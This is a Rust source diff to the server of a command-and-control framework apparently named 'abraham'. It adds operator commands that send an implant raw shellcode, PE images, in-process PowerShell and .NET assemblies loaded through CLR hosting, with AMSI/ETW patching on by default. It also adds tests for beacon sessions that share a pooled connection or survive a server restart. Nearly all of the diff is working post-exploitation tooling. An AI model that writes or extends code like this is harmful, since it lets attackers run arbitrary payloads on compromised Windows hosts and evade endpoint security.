+            // ABR-T027: inline bytes when they fit the frame, else the
+            // operator uploads the stage first and passes "path".
+            let source = request
+                .get("source")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            let path = request
+                .get("path")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            if source.is_empty() && path.is_empty() {
+                return json!({ "error": "runpe requires source (local PE) or path (staged)" });
+            }
+            if !path.is_empty() {
+                return queue_task(
+                    state,
+                    &request,
+                    TaskBody::RunPe {
+                        data: Vec::new(),
+                        path,
+                    },
+                )
+                .await;
+            }
+            match tokio::fs::read(&source).await {
+                Err(e) => json!({ "error": format!("cannot read {source}: {e}") }),
+                Ok(data) => {
+                    if data.len() > 48_000 {
+                        return json!({
+                            "error": format!(
+                                "{}B exceeds the 48000B frame cap - upload it to the target and pass 'path'",
+                                data.len()
+                            )
+                        });
+                    }
+                    queue_task(
+                        state,
+                        &request,
+                        TaskBody::RunPe {
+                            data,
+                            path: String::new(),
+                        },
+                    )
+                    .await
+                }
+            }
+        }
+        "psrun" => {
+            // ABR-T026: in-process PowerShell. The script arrives inline
+            // ("script") or from a local .ps1 ("source"); the bootstrap
+            // assembly is compiled once from tools/psboot.cs with the
+            // in-box csc and cached under cache/.
+            let mut script = request
+                .get("script")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            let source = request
+                .get("source")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            if script.is_empty() && !source.is_empty() {
+                match tokio::fs::read_to_string(&source).await {
+                    Ok(text) => script = text,
+                    Err(e) => return json!({ "error": format!("cannot read {source}: {e}") }),
+                }
+            }
+            if script.trim().is_empty() {
+                return json!({ "error": "psrun requires script or source (.ps1)" });
+            }
+            let bootstrap = match ps_bootstrap() {
+                Ok(bytes) => bytes,
+                Err(e) => return json!({ "error": e }),
+            };
+            queue_task(state, &request, TaskBody::PowerShell { script, bootstrap }).await
+        }
+        "execasm" => {
+            // ABR-T025: run an operator-side .NET assembly inside the
+            // implant through CLR hosting (optional AMSI/ETW patch
+            // first, ABR-T024).
+            let source = request
+                .get("source")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            if source.is_empty() {
+                return json!({ "error": "execasm requires source (local assembly file)" });
+            }
+            let type_name = request
+                .get("type")
+                .and_then(|v| v.as_str())
+                .unwrap_or("Prog")
+                .to_string();
+            let method_name = request
+                .get("method")
+                .and_then(|v| v.as_str())
+                .unwrap_or("Go")
+                .to_string();
+            let argument = request
+                .get("argument")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            let patch = u8::from(
+                request
+                    .get("patch")
+                    .and_then(|v| v.as_bool())
+                    .unwrap_or(true),
+            );
+            match tokio::fs::read(&source).await {
+                Err(e) => json!({ "error": format!("cannot read {source}: {e}") }),
+                Ok(data) => {
+                    if data.len() > 48_000 {
+                        return json!({ "error": "execasm assembly exceeds 48000 byte frame cap" });
+                    }
+                    queue_task(
+                        state,
+                        &request,
+                        TaskBody::ExecuteAssembly {
+                            data,
+                            type_name,
+                            method_name,
+                            argument,
+                            patch,
+                        },
+                    )
+                    .await
+                }
+            }
+        }
+        "exec" => {
+            // ABR-T022: raw shellcode from an operator-side file runs
+            // in-process on the implant. The protocol frame ceiling caps
+            // the payload at 48 KB.
+            let source = request
+                .get("source")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            if source.is_empty() {
+                return json!({ "error": "exec requires source (local shellcode file)" });
+            }
+            match tokio::fs::read(&source).await {
+                Err(e) => json!({ "error": format!("cannot read {source}: {e}") }),
+                Ok(data) => {
+                    if data.len() > 48_000 {
+                        return json!({ "error": "exec payload exceeds 48000 byte frame cap" });
+                    }
+                    queue_task(state, &request, TaskBody::Execute { data }).await
+                }
+            }
+        }
         "upload" => {
             let local = request
                 .get("local")
@@ -630,6 +1132,46 @@ async fn handle_mgmt(request: Value, state: &Arc<AppState>) -> Value {
         "results" => list_results(state, &request).await,
         _ => json!({ "error": "unknown command" }),
     }
+}
+
+/// Compiles tools/psboot.cs with the in-box .NET Framework compiler
+/// (first call) and caches the assembly under cache/psboot.dll.
+fn ps_bootstrap() -> Result<Vec<u8>, String> {
+    let cache = PathBuf::from("cache/psboot.dll");
+    if let Ok(bytes) = std::fs::read(&cache) {
+        return Ok(bytes);
+    }
+    let csc = std::path::PathBuf::from("C:\\")
+        .join("Windows")
+        .join("Microsoft.NET")
+        .join("Framework64")
+        .join("v4.0.30319")
+        .join("csc.exe");
+    if !csc.exists() {
+        return Err("in-box csc.exe not found on the teamserver host".into());
+    }
+    std::fs::create_dir_all("cache").map_err(|e| format!("cache dir: {e}"))?;
+    let out = std::process::Command::new(&csc)
+        .args(["/nologo", "/target:library"])
+        .arg(format!("/out:{}", cache.display()))
+        .arg(
+            // Absolute path: csc resolves its arguments against its own
+            // working directory quirks, and the teamserver may be launched
+            // from anywhere.
+            std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
+                .parent()
+                .unwrap()
+                .join("tools")
+                .join("psboot.cs")
+                .to_string_lossy()
+                .into_owned(),
+        )
+        .output()
+        .map_err(|e| format!("csc spawn: {e}"))?;
+    if !out.status.success() {
+        return Err(format!("csc: {}", String::from_utf8_lossy(&out.stdout)));
+    }
+    std::fs::read(&cache).map_err(|e| format!("bootstrap read: {e}"))
 }
 
 fn session_id_of(request: &Value) -> Option<u32> {
@@ -698,16 +1240,17 @@ async fn list_sessions(state: &Arc<AppState>) -> Value {
         .iter()
         .map(|id| {
             let h = &sessions[*id];
+            let info = h.info.lock().unwrap();
             json!({
                 "id": id,
-                "user": format!("{}\\{}", h.info.domain, h.info.username),
-                "hostname": h.info.hostname,
-                "pid": h.info.pid,
-                "arch": if h.info.arch == message::ARCH_X64 { "x64" } else { "arm64" },
-                "integrity_level": h.info.integrity_level,
-                "addr": h.addr,
-                "last_seen": h.last_seen,
-                "implant_version": h.info.implant_version,
+                "user": format!("{}\\{}", info.domain, info.username),
+                "hostname": info.hostname.as_str(),
+                "pid": info.pid,
+                "arch": if info.arch == message::ARCH_X64 { "x64" } else { "arm64" },
+                "integrity_level": info.integrity_level,
+                "addr": h.addr.lock().unwrap().as_str(),
+                "last_seen": h.last_seen.load(Ordering::SeqCst),
+                "implant_version": info.implant_version.as_str(),
             })
         })
         .collect();
@@ -739,4 +1282,246 @@ async fn list_results(state: &Arc<AppState>, request: &Value) -> Value {
         })
         .collect();
     json!({ "results": list })
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use abraham_common::http::{read_response, write_request};
+    use tokio::io::DuplexStream;
+
+    fn test_state(path: Option<PathBuf>) -> Arc<AppState> {
+        Arc::new(AppState {
+            sessions: RwLock::new(HashMap::new()),
+            tokens: RwLock::new(HashMap::new()),
+            provisionals: SyncMutex::new(HashMap::new()),
+            next_session_id: AtomicU32::new(1),
+            next_task_id: AtomicU32::new(1),
+            signing_key: SigningKey::generate(&mut OsRng),
+            state_path: path,
+        })
+    }
+
+    fn register_info(token: u64) -> RegisterInfo {
+        RegisterInfo {
+            session_token: token,
+            hostname: "LAB".into(),
+            username: "lab".into(),
+            domain: "LAB".into(),
+            pid: 100,
+            ppid: 4,
+            arch: message::ARCH_X64,
+            integrity_level: 2,
+            os_build: "22631".into(),
+            implant_version: "test".into(),
+        }
+    }
+
+    fn spawn_server(
+        server_end: DuplexStream,
+        state: Arc<AppState>,
+        profile: Profile,
+    ) -> tokio::task::JoinHandle<()> {
+        tokio::spawn(async move {
+            let addr: SocketAddr = "127.0.0.1:50000".parse().unwrap();
+            let _ = run_session(server_end, addr, state, profile, None).await;
+        })
+    }
+
+    /// Handshake + REGISTER through the real wire path, tagged with the
+    /// demux headers exactly as the implant sends them.
+    async fn link(
+        stream: &mut DuplexStream,
+        state: &AppState,
+        profile: &Profile,
+        token: u64,
+    ) -> Session {
+        let uri = profile.uris[0].as_str();
+        let tag = token.to_string();
+        let (secret, hello) = ClientHello::generate();
+        write_request(
+            stream,
+            "POST",
+            uri,
+            "h",
+            "ua",
+            &[(HDR_HANDSHAKE, "1"), (HDR_SESSION, &tag)],
+            &hello.to_bytes(),
+        )
+        .await
+        .unwrap();
+        let resp = read_response(stream).await.unwrap();
+        assert_eq!(resp.status, 200);
+        let raw: [u8; crypto::SERVER_HELLO_LEN] = resp.body.as_slice().try_into().unwrap();
+        let mut session = crypto::client_finish(
+            &state.signing_key.verifying_key(),
+            secret,
+            &hello,
+            &crypto::ServerHello::from_bytes(&raw),
+        )
+        .unwrap();
+        let (mt, body) = Message::Register(register_info(token)).encode();
+        let frame = session.seal(mt, &body).unwrap();
+        write_request(
+            stream,
+            "POST",
+            uri,
+            "h",
+            "ua",
+            &[(HDR_SESSION, &tag)],
+            &frame,
+        )
+        .await
+        .unwrap();
+        let resp = read_response(stream).await.unwrap();
+        assert_eq!(resp.status, 200);
+        session
+    }
+
+    async fn poll(
+        stream: &mut DuplexStream,
+        profile: &Profile,
+        session: &mut Session,
+        token: u64,
+    ) -> Vec<(u8, Vec<u8>)> {
+        let uri = profile.uris[0].as_str();
+        let (mt, body) = Message::TaskPoll.encode();
+        let frame = session.seal(mt, &body).unwrap();
+        write_request(
+            stream,
+            "POST",
+            uri,
+            "h",
+            "ua",
+            &[(HDR_SESSION, &token.to_string())],
+            &frame,
+        )
+        .await
+        .unwrap();
+        let resp = read_response(stream).await.unwrap();
+        assert_eq!(resp.status, 200);
+        open_frames(&resp.body, session).unwrap()
+    }
+
+    fn contains_task(frames: &[(u8, Vec<u8>)], id: u32) -> bool {
+        frames.iter().any(|(mt, body)| {
+            *mt == msg::TASK
+                && matches!(
+                    Message::decode(*mt, body),
+                    Ok(Message::Task(Task { id: want, .. })) if want == id
+                )
+        })
+    }
+
+    /// The Cloudflare origin-pooling shape: two logical beacon transports
+    /// whose requests interleave on ONE server-side connection. Header
+    /// routing must keep them independent, and a bad request must cost
+    /// itself, not the connection.
+    #[tokio::test]
+    async fn pooled_conn_routes_by_session_header() {
+        let (mut client, server_end) = tokio::io::duplex(64 * 1024);
+        let state = test_state(None);
+        let profile = Profile::default();
+        spawn_server(server_end, state.clone(), profile.clone());
+
+        let mut a = link(&mut client, &state, &profile, 1111).await;
+        let mut b = link(&mut client, &state, &profile, 2222).await;
+
+        // Queue a task into session A through the registry (as mgmt does).
+        let live_a = {
+            let id = *state.tokens.read().await.get(&1111).unwrap();
+            state.sessions.read().await.get(&id).unwrap().clone()
+        };
+        live_a
+            .queue
+            .send(Message::Task(Task {
+                id: 77,
+                body: TaskBody::Sleep {
+                    secs: 1,
+                    jitter: 0.0,
+                },
+            }))
+            .unwrap();
+
+        assert!(contains_task(
+            &poll(&mut client, &profile, &mut a, 1111).await,
+            77
+        ));
+        assert!(!contains_task(
+            &poll(&mut client, &profile, &mut b, 2222).await,
+            77
+        ));
+
+        // A request tagged with an unknown token is refused without
+        // killing the pooled connection.
+        write_request(
+            &mut client,
+            "POST",
+            profile.uris[0].as_str(),
+            "h",
+            "ua",
+            &[(HDR_SESSION, "9999")],
+            b"junk",
+        )
+        .await
+        .unwrap();
+        let resp = read_response(&mut client).await.unwrap();
+        assert_eq!(resp.status, 400);
+
+        // Both sessions still ride the same connection afterwards.
+        let _ = poll(&mut client, &profile, &mut a, 1111).await;
+        let _ = poll(&mut client, &profile, &mut b, 2222).await;
+    }
+
+    /// A server restart (redeploy) reloads the persisted registry; the
+    /// beacon resumes into the SAME session id and drains tasks queued
+    /// while it had no transport.
+    #[tokio::test]
+    async fn sessions_survive_restart_and_resume() {
+        let dir = std::env::temp_dir().join(format!("abraham-state-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        let path = dir.join("sessions.json");
+
+        let (mut client, server_end) = tokio::io::duplex(64 * 1024);
+        let state = test_state(Some(path.clone()));
+        let profile = Profile::default();
+        let server = spawn_server(server_end, state.clone(), profile.clone());
+        let mut a = link(&mut client, &state, &profile, 4242).await;
+        let _ = poll(&mut client, &profile, &mut a, 4242).await;
+        drop(client);
+        let _ = server.await;
+
+        // Restart: fresh process state, same file.
+        let state2 = test_state(Some(path.clone()));
+        assert_eq!(load_state(&state2, &path).await.unwrap(), 1);
+        assert_eq!(*state2.tokens.read().await.get(&4242).unwrap(), 1);
+
+        // Task queued while the beacon has no transport.
+        let live = state2.sessions.read().await.get(&1).unwrap().clone();
+        live.queue
+            .send(Message::Task(Task {
+                id: 901,
+                body: TaskBody::Sleep {
+                    secs: 1,
+                    jitter: 0.0,
+                },
+            }))
+            .unwrap();
+
+        // Re-link with the SAME token: resumes into session 1 and the
+        // offline-queued task drains.
+        let (mut client2, server_end2) = tokio::io::duplex(64 * 1024);
+        let server2 = spawn_server(server_end2, state2.clone(), profile.clone());
+        let mut a2 = link(&mut client2, &state2, &profile, 4242).await;
+        assert!(contains_task(
+            &poll(&mut client2, &profile, &mut a2, 4242).await,
+            901
+        ));
+        assert_eq!(*state2.tokens.read().await.get(&4242).unwrap(), 1);
+        drop(client2);
+        let _ = server2.await;
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
 }
